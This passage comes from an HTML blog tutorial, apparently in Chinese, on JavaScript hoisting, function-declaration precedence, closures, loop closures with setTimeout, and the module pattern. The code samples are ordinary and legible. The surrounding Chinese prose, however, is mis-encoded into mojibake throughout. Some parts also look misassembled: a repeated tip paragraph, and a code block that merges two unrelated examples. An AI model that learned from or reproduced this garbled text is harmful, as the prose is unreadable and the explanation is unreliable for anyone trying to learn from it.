çš„ä»»ä½•éƒ¨åˆ†è¢«æ‰§è¡Œä¹‹å‰ï¼Œæ‰€æœ‰çš„å£°æ˜ï¼Œå˜é‡å’Œå‡½æ•°ï¼Œéƒ½ä¼šé¦–å…ˆè¢«å¤„ç†ã€‚</p><p class="tip">å½“ä½ çœ‹åˆ° var a = 2; æ—¶ï¼Œä½ å¯èƒ½è®¤ä¸ºè¿™æ˜¯ä¸€ä¸ªè¯­å¥ã€‚ä½†æ˜¯ JavaScript å®é™…ä¸Šè®¤ä¸ºè¿™æ˜¯ä¸¤ä¸ªè¯­å¥ï¼švar a; å’Œ a = 2;ã€‚ç¬¬ä¸€ä¸ªè¯­å¥ï¼Œå£°æ˜ï¼Œæ˜¯åœ¨ç¼–è¯‘é˜¶æ®µè¢«å¤„ç†çš„ã€‚ç¬¬äºŒä¸ªè¯­å¥ï¼Œèµ‹å€¼ï¼Œä¸ºäº†æ‰§è¡Œé˜¶æ®µè€Œç•™åœ¨ åŸå¤„ã€‚</p><p>äºæ˜¯æˆ‘ä»¬çš„ç¬¬ä¸€ä¸ªä»£ç æ®µåº”å½“è¢«è®¤ä¸ºæ˜¯è¿™æ ·è¢«å¤„ç†çš„ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="number">2</span>;</span><br><span class="line"><span class="built_in">console</span>.log( a );</span><br></pre></td></tr></table></figure><p>ç›¸ä¼¼åœ°ï¼Œæˆ‘ä»¬çš„ç¬¬äºŒä¸ªä»£ç æ®µå®é™…ä¸Šè¢«å¤„ç†ä¸ºï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log( a );</span><br><span class="line"></span><br><span class="line">a = <span class="number">2</span>;</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥ï¼Œå…³äºè¿™ç§å¤„ç†çš„ä¸€ä¸ªæœ‰äº›éšå–»çš„è€ƒè™‘æ–¹å¼æ˜¯ï¼Œå˜é‡å’Œå‡½æ•°å£°æ˜è¢«ä»å®ƒä»¬åœ¨ä»£ç æµä¸­å‡ºç°çš„ä½ç½®â€œç§»åŠ¨â€åˆ°ä»£ç çš„é¡¶ç«¯ã€‚è¿™å°±äº§ç”Ÿäº†â€œæå‡â€è¿™ä¸ªåå­—ã€‚</p><h4 id="å‡½æ•°ç”³æ˜æå‡"><a href="#å‡½æ•°ç”³æ˜æå‡" class="headerlink" title="å‡½æ•°ç”³æ˜æå‡"></a>å‡½æ•°ç”³æ˜æå‡</h4><p class="tip">å½“ä½ çœ‹åˆ° var a = 2; æ—¶ï¼Œä½ å¯èƒ½è®¤ä¸ºè¿™æ˜¯ä¸€ä¸ªè¯­å¥ã€‚ä½†æ˜¯ JavaScript å®é™…ä¸Šè®¤ä¸ºè¿™æ˜¯ä¸¤ä¸ªè¯­å¥ï¼švar a; å’Œ a = 2;ã€‚ç¬¬ä¸€ä¸ªè¯­å¥ï¼Œå£°æ˜ï¼Œæ˜¯åœ¨ç¼–è¯‘é˜¶æ®µè¢«å¤„ç†çš„ã€‚ç¬¬äºŒä¸ªè¯­å¥ï¼Œèµ‹å€¼ï¼Œä¸ºäº†æ‰§è¡Œé˜¶æ®µè€Œç•™åœ¨ åŸå¤„ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">foo();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log( a ); <span class="comment">// undefined</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‡½æ•° foo çš„å£°æ˜ï¼ˆåœ¨è¿™ä¸ªä¾‹å­ä¸­å®ƒè¿˜ åŒ…å« ä¸€ä¸ªéšå«çš„ã€å®é™…ä¸ºå‡½æ•°çš„å€¼ï¼‰è¢«æå‡äº†ï¼Œå› æ­¤ç¬¬ä¸€è¡Œçš„è°ƒç”¨æ˜¯å¯ä»¥æ‰§è¡Œçš„ã€‚</p><p class="tip">è¿˜éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæå‡æ˜¯ ä»¥ä½œç”¨åŸŸä¸ºå•ä½çš„ã€‚æ‰€ä»¥è™½ç„¶æˆ‘ä»¬çš„å‰ä¸€ä¸ªä»£ç æ®µè¢«ç®€åŒ–ä¸ºä»…å«æœ‰å…¨å±€ä½œç”¨åŸŸï¼Œä½†æ˜¯æˆ‘ä»¬ç°åœ¨æ£€è§†çš„å‡½æ•°foo(..)æœ¬èº«å±•ç¤ºäº†ï¼Œvar aè¢«æå‡è‡³foo(..)çš„é¡¶ç«¯ï¼ˆå¾ˆæ˜æ˜¾ï¼Œä¸æ˜¯ç¨‹åºçš„é¡¶ç«¯ï¼‰ã€‚æ‰€ä»¥è¿™ä¸ªç¨‹åºä¹Ÿè®¸å¯ä»¥æ›´å‡†ç¡®åœ°è§£é‡Šä¸ºï¼š</p><p>å‡½æ•°å£°æ˜ä¼šè¢«æå‡ï¼Œå°±åƒæˆ‘ä»¬çœ‹åˆ°çš„ã€‚ä½†æ˜¯å‡½æ•°è¡¨è¾¾å¼ä¸ä¼šã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> a;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log( a ); <span class="comment">// undefined</span></span><br><span class="line"></span><br><span class="line">a = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foo();</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä¸</span></span><br><span class="line">foo(); <span class="comment">// ä¸æ˜¯ ReferenceErrorï¼Œ è€Œæ˜¯ TypeError!</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> foo = <span class="function"><span class="keyword">function</span> <span class="title">bar</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="å‡½æ•°ä¼˜å…ˆ"><a href="#å‡½æ•°ä¼˜å…ˆ" class="headerlink" title="å‡½æ•°ä¼˜å…ˆ"></a>å‡½æ•°ä¼˜å…ˆ</h4><p class="tip">å‡½æ•°å£°æ˜å’Œå˜é‡å£°æ˜éƒ½ä¼šè¢«æå‡ã€‚ä½†ä¸€ä¸ªå¾®å¦™çš„ç»†èŠ‚ï¼ˆå¯ä»¥ åœ¨æ‹¥æœ‰å¤šä¸ªâ€œé‡å¤çš„â€å£°æ˜çš„ä»£ç ä¸­å‡ºç°ï¼‰æ˜¯ï¼Œå‡½æ•°ä¼šé¦–å…ˆè¢«æå‡ï¼Œç„¶åæ‰æ˜¯å˜é‡ã€‚</p><p>è€ƒè™‘è¿™æ®µä»£ç ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">foo(); <span class="comment">// 1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> foo;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log( <span class="number">1</span> );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foo = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log( <span class="number">2</span> );</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1 è¢«æ‰“å°äº†ï¼Œè€Œä¸æ˜¯ 2ï¼è¿™ä¸ªä»£ç æ®µè¢« å¼•æ“ è§£é‡Šæ‰§è¡Œä¸ºï¼š</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log( <span class="number">1</span> );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foo(); <span class="comment">// 1</span></span><br><span class="line"></span><br><span class="line">foo = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log( <span class="number">2</span> );</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>æ³¨æ„é‚£ä¸ª var foo æ˜¯ä¸€ä¸ªé‡å¤ï¼ˆå› æ­¤è¢«æ— è§†ï¼‰çš„å£°æ˜ï¼Œå³ä¾¿å®ƒå‡ºç°åœ¨ function foo()â€¦ å£°æ˜ä¹‹å‰ï¼Œå› ä¸ºå‡½æ•°å£°æ˜æ˜¯åœ¨æ™®é€šå˜é‡ä¹‹å‰è¢«æå‡çš„ã€‚</p><p>è™½ç„¶å¤šä¸ª/é‡å¤çš„ var å£°æ˜å®è´¨ä¸Šæ˜¯è¢«å¿½ç•¥çš„ï¼Œä½†æ˜¯åç»­çš„å‡½æ•°å£°æ˜ç¡®å®ä¼šè¦†ç›–å‰ä¸€ä¸ªã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">foo(); <span class="comment">// 3</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log( <span class="number">1</span> );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> foo = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log( <span class="number">2</span> );</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log( <span class="number">3</span> );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="äºŒã€é—­åŒ…"><a href="#äºŒã€é—­åŒ…" class="headerlink" title="äºŒã€é—­åŒ…"></a>äºŒã€é—­åŒ…</h2><h3 id="ä»€ä¹ˆæ˜¯é—­åŒ…"><a href="#ä»€ä¹ˆæ˜¯é—­åŒ…" class="headerlink" title="ä»€ä¹ˆæ˜¯é—­åŒ…"></a>ä»€ä¹ˆæ˜¯é—­åŒ…</h3><p>é—­åŒ…å¯¹äºå¤§å¤šæ•°ç†Ÿç»ƒçš„JavaScriptä¹Ÿç®—æ˜¯ä¸€ä¸ªæ¨¡ç³Šä¸æ¸…çš„æ¦‚å¿µï¼Œä»€ä¹ˆæ˜¯é—­åŒ…å‘¢ï¼Œé—­åŒ…èƒ½ç»™æˆ‘ä»¬å¸¦æ¥ä»€ä¹ˆå¥½å¤„å’Œåå¤„ï¼Ÿ</p><p class="tip">ç®€å•æ¥è¯´å¯ä»¥ç”¨ä¸€å¥è¯æ¦‚æ‹¬é—­åŒ…çš„ç‰¹æ€§ä¸ä½œç”¨ï¼šé—­åŒ…å°±æ˜¯å‡½æ•°èƒ½å¤Ÿè®°ä½å¹¶è®¿é—®å®ƒçš„è¯æ³•ä½œç”¨åŸŸï¼Œå³ä½¿è¿™ä¸ªå‡½æ•°åœ¨å®ƒçš„è¯æ³•ä½œç”¨åŸŸå¤–æ‰§è¡Œ</p><blockquote><p>è®©æˆ‘ä»¬è·³è¿›ä»£ç æ¥è¯´æ˜è¿™ä¸ªå®šä¹‰ï¼š</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> a = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bar</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log( a ); <span class="comment">// 2</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bar();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foo();</span><br></pre></td></tr></table></figure><p>ä¸Šé¢çš„ä»£ç æ®µè¢«è®¤ä¸ºæ˜¯å‡½æ•° bar() åœ¨å‡½æ•° foo() çš„ä½œç”¨åŸŸä¸Šæœ‰ä¸€ä¸ª é—­åŒ….æ¢ä¸€ç§ç•¥æœ‰ä¸åŒçš„è¯´æ³•æ˜¯ï¼Œbar() é—­ä½äº† foo() çš„ä½œç”¨åŸŸã€‚ä¸ºä»€ä¹ˆï¼Ÿå› ä¸º bar() åµŒå¥—åœ°å‡ºç°åœ¨ foo() å†…éƒ¨ã€‚å°±è¿™ä¹ˆç®€å•ã€‚</p><h3 id="é—­åŒ…çš„ç‰¹æ€§"><a href="#é—­åŒ…çš„ç‰¹æ€§" class="headerlink" title="é—­åŒ…çš„ç‰¹æ€§"></a>é—­åŒ…çš„ç‰¹æ€§</h3><p>æ ¹æ®é—­åŒ…çš„å®šä¹‰æˆ‘ä»¬èƒ½å¾ˆå®¹æ˜“è®°ä½å…¶ä¸¤å¤§ç‰¹ç‚¹ï¼š</p><p>1ã€èƒ½å¤Ÿè®°ä½å¹¶è®¿é—®å®ƒçš„è¯æ³•ä½œç”¨åŸŸ<br>2ã€å³ä½¿åœ¨å®ƒçš„ä½œç”¨åŸŸå¤–æ‰§è¡Œ</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> a = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bar</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log( a );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> bar;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> baz = foo();</span><br><span class="line"></span><br><span class="line">baz(); <span class="comment">// 2 -- å“‡å™¢ï¼Œçœ‹åˆ°é—­åŒ…äº†ï¼Œä¼™è®¡ã€‚</span></span><br></pre></td></tr></table></figure><ul><li>bar() è¢«æ‰§è¡Œäº†ï¼Œå¿…ç„¶çš„ã€‚ä½†æ˜¯åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œå®ƒæ˜¯åœ¨å®ƒè¢«å£°æ˜çš„è¯æ³•ä½œç”¨åŸŸ å¤–éƒ¨ è¢«æ‰§è¡Œçš„ã€‚</li><li>foo() è¢«æ‰§è¡Œä¹‹åï¼Œä¸€èˆ¬è¯´æ¥æˆ‘ä»¬ä¼šæœŸæœ› foo() çš„æ•´ä¸ªå†…éƒ¨ä½œç”¨åŸŸéƒ½å°†æ¶ˆå¤±ï¼Œå› ä¸ºæˆ‘ä»¬çŸ¥é“ å¼•æ“ å¯ç”¨äº† åƒåœ¾å›æ”¶å™¨ åœ¨å†…å­˜ä¸å†è¢«ä½¿ç”¨æ—¶æ¥å›æ”¶å®ƒä»¬ã€‚å› ä¸ºå¾ˆæ˜¾ç„¶ foo() çš„å†…å®¹ä¸å†è¢«ä½¿ç”¨äº†ï¼Œæ‰€ä»¥çœ‹èµ·æ¥å®ƒä»¬å¾ˆè‡ªç„¶åœ°åº”è¯¥è¢«è®¤ä¸ºæ˜¯ æ¶ˆå¤±äº†ã€‚</li><li>ä½†æ˜¯é—­åŒ…çš„â€œé­”æ³•â€ä¸ä¼šè®©è¿™å‘ç”Ÿã€‚å†…éƒ¨çš„ä½œç”¨åŸŸå®é™…ä¸Š ä¾ç„¶ â€œåœ¨ä½¿ç”¨â€ï¼Œå› æ­¤å°†ä¸ä¼šæ¶ˆå¤±ã€‚è°åœ¨ä½¿ç”¨å®ƒï¼Ÿå‡½æ•° bar() æœ¬èº«ã€‚</li><li>æœ‰èµ–äºå®ƒè¢«å£°æ˜çš„ä½ç½®ï¼Œbar() æ‹¥æœ‰ä¸€ä¸ªè¯æ³•ä½œç”¨åŸŸé—­åŒ…è¦†ç›–ç€ foo() çš„å†…éƒ¨ä½œç”¨åŸŸï¼Œé—­åŒ…ä¸ºäº†èƒ½ä½¿ bar() åœ¨ä»¥åä»»æ„çš„æ—¶åˆ»å¯ä»¥å¼•ç”¨è¿™ä¸ªä½œç”¨åŸŸè€Œä¿æŒå®ƒçš„å­˜åœ¨ã€‚</li><li>bar() ä¾ç„¶æ‹¥æœ‰å¯¹é‚£ä¸ªä½œç”¨åŸŸçš„å¼•ç”¨ï¼Œè€Œè¿™ä¸ªå¼•ç”¨ç§°ä¸ºé—­åŒ…ã€‚</li></ul><h3 id="é—­åŒ…ä½¿ç”¨åœºæ™¯"><a href="#é—­åŒ…ä½¿ç”¨åœºæ™¯" class="headerlink" title="é—­åŒ…ä½¿ç”¨åœºæ™¯"></a>é—­åŒ…ä½¿ç”¨åœºæ™¯</h3><h4 id="æ— å¤„ä¸åœ¨çš„é—­åŒ…"><a href="#æ— å¤„ä¸åœ¨çš„é—­åŒ…" class="headerlink" title="æ— å¤„ä¸åœ¨çš„é—­åŒ…"></a>æ— å¤„ä¸åœ¨çš„é—­åŒ…</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">wait</span>(<span class="params">message</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">setTimeout( <span class="function"><span class="keyword">function</span> <span class="title">timer</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log( message );</span><br><span class="line">&#125;, <span class="number">1000</span> );</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">wait( <span class="string">"Hello, closure!"</span> );</span><br></pre></td></tr></table></figure><ul><li>æˆ‘ä»¬æ‹¿æ¥ä¸€ä¸ªå†…éƒ¨å‡½æ•°ï¼ˆåä¸º timerï¼‰å°†å®ƒä¼ é€’ç»™ setTimeout(..)ã€‚ä½†æ˜¯ timer æ‹¥æœ‰è¦†ç›– wait(..) çš„ä½œç”¨åŸŸçš„é—­åŒ…ï¼Œå®é™…ä¸Šä¿æŒå¹¶ä½¿ç”¨ç€å¯¹å˜é‡ message çš„å¼•ç”¨ã€‚</li><li>åœ¨æˆ‘ä»¬æ‰§è¡Œ wait(..) ä¸€åƒæ¯«ç§’ä¹‹åï¼Œè¦ä¸æ˜¯å†…éƒ¨å‡½æ•° timer ä¾ç„¶æ‹¥æœ‰è¦†ç›–ç€ wait() å†…éƒ¨ä½œç”¨åŸŸçš„é—­åŒ…ï¼Œå®ƒæ—©å°±ä¼šæ¶ˆå¤±äº†ã€‚</li><li>åœ¨ å¼•æ“ çš„å†…è„æ·±å¤„ï¼Œå†…å»ºçš„å·¥å…· setTimeout(..) æ‹¥æœ‰ä¸€äº›å‚æ•°çš„å¼•ç”¨ï¼Œå¯èƒ½ç§°ä¸º fn æˆ–è€… func æˆ–è€…å…¶ä»–è¯¸å¦‚æ­¤ç±»çš„ä¸œè¥¿ã€‚å¼•æ“ å»è°ƒç”¨è¿™ä¸ªå‡½æ•°ï¼Œå®ƒè°ƒç”¨æˆ‘ä»¬çš„å†…éƒ¨ timer å‡½æ•°ï¼Œè€Œè¯æ³•ä½œç”¨åŸŸä¾ç„¶å®Œå¥½æ— æŸã€‚</li></ul><h4 id="å¾ªç¯-é—­åŒ…"><a href="#å¾ªç¯-é—­åŒ…" class="headerlink" title="å¾ªç¯ + é—­åŒ…"></a>å¾ªç¯ + é—­åŒ…</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">1</span>; i&lt;=<span class="number">5</span>; i++) &#123;</span><br><span class="line">setTimeout( <span class="function"><span class="keyword">function</span> <span class="title">timer</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log( i );</span><br><span class="line">&#125;, i*<span class="number">1000</span> );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™æ®µä»£ç çš„ç²¾ç¥æ˜¯ï¼Œæˆ‘ä»¬ä¸€èˆ¬å°† æœŸå¾… å®ƒçš„è¡Œä¸ºæ˜¯åˆ†åˆ«æ‰“å°æ•°å­—â€œ1â€ï¼Œâ€œ2â€ï¼Œâ€¦â€¦â€œ5â€ï¼Œä¸€æ¬¡ä¸€ä¸ªï¼Œä¸€ç§’ä¸€ä¸ª<br>å®é™…ä¸Šï¼Œå¦‚æœä½ è¿è¡Œè¿™æ®µä»£ç ï¼Œä½ ä¼šå¾—åˆ°â€œ6â€è¢«æ‰“å°5æ¬¡ï¼Œä¸€ç§’ä¸€ä¸ªã€‚</p><p class="tip">æˆ‘ä»¬è¯•å›¾ æš—ç¤º åœ¨è¿­ä»£æœŸé—´ï¼Œå¾ªç¯çš„æ¯æ¬¡è¿­ä»£éƒ½â€œæ•æ‰â€ä¸€ä»½å¯¹ i çš„æ‹·è´ã€‚ä½†æ˜¯ï¼Œè™½ç„¶æ‰€æœ‰è¿™5ä¸ªå‡½æ•°åœ¨æ¯æ¬¡å¾ªç¯è¿­ä»£ä¸­åˆ†ç¦»åœ°å®šä¹‰ï¼Œç”±äºä½œç”¨åŸŸçš„å·¥ä½œæ–¹å¼ï¼Œå®ƒä»¬ éƒ½é—­åŒ…åœ¨åŒä¸€ä¸ªå…±äº«çš„å…¨å±€ä½œç”¨åŸŸä¸Šï¼Œè€Œå®ƒäº‹å®ä¸Šåªæœ‰ä¸€ä¸ª i</p><p>å¦‚ä½•è§£å†³è¿™ä¸ªé—®é¢˜å‘¢ï¼Œå®šä¹‰ä¸€ä¸ªæ–°çš„ä½œç”¨åŸŸï¼Œåœ¨æ¯æ¬¡è¿­ä»£æ—¶æŒæœ‰å€¼ i çš„ä¸€ä¸ªæ‹·è´</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">1</span>; i&lt;=<span class="number">5</span>; i++) &#123;</span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params">j</span>)</span>&#123;</span><br><span class="line">setTimeout( <span class="function"><span class="keyword">function</span> <span class="title">timer</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log( j );</span><br><span class="line">&#125;, j*<span class="number">1000</span> );</span><br><span class="line">&#125;)( i );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="æ¨¡å—åŒ–"><a href="#æ¨¡å—åŒ–" class="headerlink" title="æ¨¡å—åŒ–"></a>æ¨¡å—åŒ–</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">CoolModule</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> something = <span class="string">"cool"</span>;</span><br><span class="line"><span class="keyword">var</span> another = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">doSomething</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log( something );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">doAnother</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log( another.join( <span class="string">" ! "</span> ) );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> &#123;</span><br><span class="line">doSomething: doSomething,</span><br><span class="line">doAnother: doAnother</span><br><span class="line">&#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> foo = CoolModule();</span><br><span class="line"></span><br><span class="line">foo.doSomething(); <span class="comment">// cool</span></span><br><span class="line">foo.doAnother(); <span class="comment">// 1 ! 2 ! 3</span></span><br></pre></td></tr></table></figure><p>é¦–å…ˆï¼ŒCoolModule() åªæ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œä½†å®ƒ å¿…é¡»è¢«è°ƒç”¨ æ‰èƒ½æˆä¸ºä¸€ä¸ªè¢«åˆ›å»ºçš„æ¨¡å—å®ä¾‹ã€‚æ²¡æœ‰å¤–éƒ¨å‡½æ•°çš„æ‰§è¡Œï¼Œå†…éƒ¨ä½œç”¨åŸŸçš„åˆ›å»ºå’Œé—­åŒ…éƒ½ä¸ä¼šå‘ç”Ÿã€‚</p><p>ç¬¬äºŒï¼ŒCoolModule() å‡½æ•°è¿”å›ä¸€ä¸ªå¯¹è±¡ï¼Œé€šè¿‡å¯¹è±¡å­—é¢é‡è¯­æ³• { key: value, â€¦ } æ ‡è®°ã€‚è¿™ä¸ªæˆ‘ä»¬è¿”å›çš„å¯¹è±¡æ‹¥æœ‰æŒ‡å‘æˆ‘ä»¬å†…éƒ¨å‡½æ•°çš„å¼•ç”¨ï¼Œä½†æ˜¯ æ²¡æœ‰ æŒ‡å‘æˆ‘ä»¬å†…éƒ¨æ•°æ®å˜é‡çš„å¼•ç”¨ã€‚æˆ‘ä»¬å¯ä»¥å°†å®ƒä»¬ä¿æŒä¸ºéšè—å’Œç§æœ‰çš„ã€‚å¯ä»¥å¾ˆæ°å½“åœ°è®¤ä¸ºè¿™ä¸ªè¿”å›å€¼å¯¹è±¡å®è´¨ä¸Šæ˜¯ä¸€ä¸ª æˆ‘ä»¬æ¨¡å—çš„å…¬æœ‰APIã€‚</p><p>è¿™ä¸ªè¿”å›å€¼å¯¹è±¡æœ€ç»ˆè¢«èµ‹å€¼ç»™å¤–éƒ¨å˜é‡ fooï¼Œç„¶åæˆ‘ä»¬å¯ä»¥åœ¨è¿™ä¸ªAPIä¸Šè®¿é—®é‚£äº›å±æ€§ï¼Œæ¯”å¦‚ foo.doSomething()</p><h4 id="ç°ä»£çš„æ¨¡å—"><a href="#ç°ä»£çš„æ¨¡å—" class="headerlink" title="ç°ä»£çš„æ¨¡å—"></a>ç°ä»£çš„æ¨¡å—</h4><p class="tip">å„ç§æ¨¡å—ä¾èµ–åŠ 